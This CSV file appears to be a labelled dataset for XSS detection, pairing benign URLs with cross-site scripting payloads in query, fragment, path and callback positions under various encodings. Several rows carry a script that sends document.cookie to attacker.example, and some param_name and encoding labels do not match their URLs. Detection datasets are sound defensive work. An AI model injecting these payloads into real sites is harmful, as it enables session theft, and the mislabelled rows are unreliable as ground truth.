url,payload,carrier,param_name,encoded,notes,label
https://webapp.local/search?q=2025-10-01,2025-10-01,query,q,raw,benign,0
https://mysite.example/api?callback=welcome&id=1&session=en,welcome,callback,id,raw,benign,0
"https://webapp.local/api?callback=""><img src=x onerror=alert(1)>&id=1","""><img src=x onerror=alert(1)>",callback,callback,raw,attribute_breakout_img,1
https://webapp.local/redirect?url=https://victim.example/?p=home10711,home10711,redirect,s,raw,benign,0
https://demo.example.org/search?name=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&utm_source=1,');document.location='javascript:alert(1)'//,query,name,urlencoded,document_location_js,1
https://example.com/page#blog,blog,fragment,,raw,benign,0
https://webapp.local/page#details,details,fragment,,raw,benign,0
https://shop.example/search?ref=prices,prices,query,ref,raw,benign,0
https://service.test/search?ref=index&utm_source=1,index,query,ref,raw,benign,0
https://example.com/search?callback=news,news,query,callback,raw,benign,0
https://vulnerable.app/search?msg=<body onload=alert(1)>&lang=0,<body onload=alert(1)>,query,msg,raw,body_onload,1
https://mysite.example/search?callback=profile92959&ref=en,profile92959,query,callback,raw,benign,0
https://webapp.local/page#<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,fragment,,raw,meta_refresh_js_uri,1
https://testsite.local/search?view=blog&page=google,blog,query,view,raw,benign,0
https://portal.example.net/api?callback=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&id=1,"""><img src=x onerror=alert(1)>",callback,callback,urlencoded,attribute_breakout_img,1
https://webapp.local/redirect?url=https://victim.example/?p=order&page=newsletter,order,redirect,redirect,raw,benign,0
https://portal.example.net/search?id=profile,profile,query,id,raw,benign,0
https://mysite.example/search?q=4221415&utm_source=affiliate,4221415,query,q,raw,benign,0
https://testsite.local/search?s=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,s,urlencoded,img_onerror_obf,1
https://shop.example/search?query=');alert(1);//&lang=0,');alert(1);//,query,query,raw,inline_js_snippet,1
https://mysite.example/page#contact,contact,fragment,,raw,benign,0
https://shop.example/search?s=');alert(1);//,');alert(1);//,query,s,raw,inline_js_snippet,1
https://testsite.local/search?name=category,category,query,name,raw,benign,0
https://portal.example.net/search?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,page,urlencoded,already_encoded,1
https://catalog.example/search?file=article&utm_source=newsletter,article,query,file,raw,benign,0
https://service.test/search?redirect=about94970,about94970,query,redirect,raw,benign,0
https://example.com/search?callback=home&session=1,home,query,callback,raw,benign,0
https://catalog.example/api?callback=profile&id=1,profile,callback,lang,raw,benign,0
https://example.com/redirect?url=https://victim.example/?p=item&utm_source=0,item,redirect,s,raw,benign,0
https://catalog.example/search?s=news&ref=affiliate,news,query,s,raw,benign,0
https://example.com/search?input=product,product,query,input,raw,benign,0
https://blog.example/page#product,product,fragment,,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,redirect,tmpl,raw,iframe_js_uri,1
https://service.test/user/product68150/profile,product68150,path,,raw,benign,0
https://example.com/search?q=news&page=newsletter,news,query,q,raw,benign,0
https://mysite.example/api?callback=contact&id=1&lang=newsletter,contact,callback,lang,raw,benign,0
https://portal.example.net/search?view=en&lang=newsletter,en,query,view,raw,benign,0
https://shop.example/api?callback=');alert(1);//&id=1,');alert(1);//,callback,callback,raw,inline_js_snippet,1
https://catalog.example/search?session=item-x,item-x,query,session,raw,benign,0
https://blog.example/search?file=home&source=newsletter,home,query,file,raw,benign,0
https://shop.example/search?ref=blog,blog,query,ref,raw,benign,0
https://shop.example/search?id=%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,id,double_urlencoded,svg_cdata_script,1
https://testsite.local/user/&quot;&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;/profile,"""><video><source onerror=alert(1)></video>",path,,html_entity,attribute_breakout_video,1
https://webapp.local/page#product-usr,product-usr,fragment,,raw,benign,0
https://blog.example/search?q=2025-10-01,2025-10-01,query,q,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&ref=xyz,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,redirect,id,raw,script_in_math,1
https://shop.example/api?callback=blog&id=1,blog,callback,page,raw,benign,0
https://mysite.example/search?query=category,category,query,query,raw,benign,0
https://testsite.local/user/checkout/profile,checkout,path,,raw,benign,0
https://webapp.local/search?msg=news,news,query,msg,raw,benign,0
https://portal.example.net/page#welcome-2025,welcome-2025,fragment,,raw,benign,0
https://demo.example.org/search?name=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&page=0,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,name,html_entity,script_in_math,1
https://testsite.local/search?callback=details,details,query,callback,raw,benign,0
https://webapp.local/search?name=<iframe src='javascript:alert(1)'></iframe>&session=xyz,<iframe src='javascript:alert(1)'></iframe>,query,name,raw,iframe_js_uri,1
https://example.com/user/signup18238/profile,signup18238,path,,raw,benign,0
https://blog.example/search?utm_source=details&ref=en,details,query,utm_source,raw,benign,0
https://testsite.local/search?q=&quot;&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;,"""><video><source onerror=alert(1)></video>",query,q,html_entity,attribute_breakout_video,1
https://catalog.example/search?lang=item&page=affiliate,item,query,lang,raw,benign,0
https://vulnerable.app/search?s=%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,query,s,urlencoded,inline_js_snippet,1
https://shop.example/search?s=42&utm_source=0,42,query,s,raw,benign,0
https://webapp.local/search?search=42,42,query,search,raw,benign,0
https://shop.example/search?view=2025-10-01,2025-10-01,query,view,raw,benign,0
https://demo.example.org/search?ref=details,details,query,ref,raw,benign,0
https://catalog.example/search?id=page,page,query,id,raw,benign,0
https://webapp.local/user/test-2025/profile,test-2025,path,,raw,benign,0
https://testsite.local/api?callback=%3Cbody+onload%3Dalert%281%29%3E&id=1,<body onload=alert(1)>,callback,id,mixed,body_onload,1
https://vulnerable.app/search?q=');document.location='javascript:alert(1)'//&page=google,');document.location='javascript:alert(1)'//,query,q,raw,document_location_js,1
https://example.com/page#%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,fragment,,urlencoded,document_location_js,1
https://mysite.example/page#login,login,fragment,,raw,benign,0
https://service.test/search?page=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&lang=xyz,');document.location='javascript:alert(1)'//,query,page,urlencoded,document_location_js,1
https://service.test/user/%3Cscript%3Ealert(1)%3C/script%3E/profile,%3Cscript%3Ealert(1)%3C/script%3E,path,,html_entity,already_encoded,1
https://service.test/search?redirect=checkout,checkout,query,redirect,raw,benign,0
https://example.com/search?msg=2025-10-01,2025-10-01,query,msg,raw,benign,0
https://webapp.local/user/%3Cscript%3Ealert%281%29%3C%2Fscript%3E/profile,%3Cscript%3Ealert(1)%3C/script%3E,path,,mixed,already_encoded,1
"https://shoP.eXamplE/search?s=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&lang=google","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,s,raw,eval_obf,1
https://portal.example.net/search?search=user&ref=0,user,query,search,raw,benign,0
https://shop.example/search?url=%3Cimg+src%3D1+onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&lang=0,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,url,mixed,img_onerror_obf,1
https://service.test/api?callback=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&id=1,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,callback,callback,raw,cookie_exfil,1
https://webapp.local/user/<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>/profile,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,path,,raw,svg_cdata_script,1
https://service.test/page#<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,fragment,,raw,script_in_math,1
https://example.com/search?q=item&utm_source=newsletter,item,query,q,raw,benign,0
https://catalog.example/search?file=order&session=google,order,query,file,raw,benign,0
https://webapp.local/search?page=item&lang=affiliate,item,query,page,raw,benign,0
https://mysite.example/page#contact,contact,fragment,,raw,benign,0
https://catalog.example/api?callback=login-x&id=1,login-x,callback,ref,raw,benign,0
https://webapp.local/search?ref=item&source=0,item,query,ref,raw,benign,0
https://mysite.example/user/cart/profile,cart,path,,raw,benign,0
https://portal.example.net/api?callback=home&id=1&page=0,home,callback,file,raw,benign,0
https://example.com/user/%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,mixed,cookie_exfil,1
https://portal.example.net/user/index/profile,index,path,,raw,benign,0
https://service.test/search?view=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,view,urlencoded,cookie_exfil,1
https://testsite.local/search?callback=signup-details,signup-details,query,callback,raw,benign,0
https://mysite.example/api?callback=test&id=1&utm_source=google,test,callback,session,raw,benign,0
https://portal.example.net/search?tmpl=<body onload=alert(1)>,<body onload=alert(1)>,query,tmpl,raw,body_onload,1
https://webapp.local/page#article,article,fragment,,raw,benign,0
https://service.test/user/&lt;script&gt;alert(1)&lt;/script&gt;/profile,<script>alert(1)</script>,path,,html_entity,script_tag,1
https://blog.example/search?ref=en,en,query,ref,raw,benign,0
https://webapp.local/search?q=&quot;&gt;&lt;svg onload=alert(1)&gt;,"""><svg onload=alert(1)>",query,q,html_entity,attribute_breakout_svg,1
https://example.com/page#%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",fragment,,urlencoded,eval_obf,1
https://portal.example.net/search?search=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,search,urlencoded,script_in_math,1
https://example.com/search?search=login&session=affiliate,login,query,search,raw,benign,0
https://service.test/user/%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,urlencoded,cookie_exfil,1
https://webapp.local/search?file=checkout-new,checkout-new,query,file,raw,benign,0
https://service.test/search?ref=cart,cart,query,ref,raw,benign,0
https://catalog.example/search?utm_source=article,article,query,utm_source,raw,benign,0
https://shop.example/search?url=42-details&ref=affiliate,42-details,query,url,raw,benign,0
https://mysite.example/search?view=page&session=organic,page,query,view,raw,benign,0
https://portal.example.net/user/checkout/profile,checkout,path,,raw,benign,0
https://webapp.local/search?query=article,article,query,query,raw,benign,0
https://webapp.local/search?view=page,page,query,view,raw,benign,0
https://demo.example.org/search?s=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,s,urlencoded,script_tag,1
https://vulnerable.app/api?callback=%22%3E%3Csvg%20onload%3Dalert%281%29%3E&id=1&page=1,"""><svg onload=alert(1)>",callback,view,urlencoded,attribute_breakout_svg,1
"https://example.com/redirect?url=https://victim.example/?p=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&lang=en","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",redirect,query,raw,eval_obf,1
https://catalog.example/search?redirect=welcome,welcome,query,redirect,raw,benign,0
"https://DeMo.example.OrG/search?id=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,id,raw,attribute_breakout_svg,1
https://catalog.example/page#welcome,welcome,fragment,,raw,benign,0
https://shop.example/search?redirect=order&session=google,order,query,redirect,raw,benign,0
https://shop.example/user/product/profile,product,path,,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=2025-10-01-x&source=affiliate,2025-10-01-x,redirect,url,raw,benign,0
https://catalog.example/search?file=about,about,query,file,raw,benign,0
https://testsite.local/search?s=javascript:alert(1),javascript:alert(1),query,s,raw,js_uri,1
https://testsite.local/search?page=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E,<iframe src='javascript:alert(1)'></iframe>,query,page,urlencoded,iframe_js_uri,1
https://service.test/search?redirect=checkout-details,checkout-details,query,redirect,raw,benign,0
https://shop.example/search?file=%257B%257Bconstructor.constructor%2528%2527alert%25281%2529%2527%2529%2528%2529%257D%257D,{{constructor.constructor('alert(1)')()}},query,file,double_urlencoded,template_injection,1
https://webapp.local/search?msg=home-usr,home-usr,query,msg,raw,benign,0
https://example.com/search?name=42&source=affiliate,42,query,name,raw,benign,0
https://webapp.local/search?ref=details&session=google,details,query,ref,raw,benign,0
https://shop.example/api?callback=home-ref&id=1,home-ref,callback,msg,raw,benign,0
https://webapp.local/page#&#x27;);document.location=&#x27;javascript:alert(1)&#x27;//,');document.location='javascript:alert(1)'//,fragment,,html_entity,document_location_js,1
https://service.test/search?file=en-details,en-details,query,file,raw,benign,0
https://blog.example/search?redirect=prices&ref=affiliate,prices,query,redirect,raw,benign,0
https://testsite.local/api?callback=en&id=1&lang=organic,en,callback,id,raw,benign,0
https://shop.example/search?msg=contact-info,contact-info,query,msg,raw,benign,0
https://portal.example.net/user/1/profile,1,path,,raw,benign,0
https://shop.example/search?url=42&session=organic,42,query,url,raw,benign,0
https://demo.example.org/search?msg=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,msg,urlencoded,img_onerror_obf,1
https://testsite.local/search?q=index,index,query,q,raw,benign,0
https://mysite.example/search?name=profile&page=1,profile,query,name,raw,benign,0
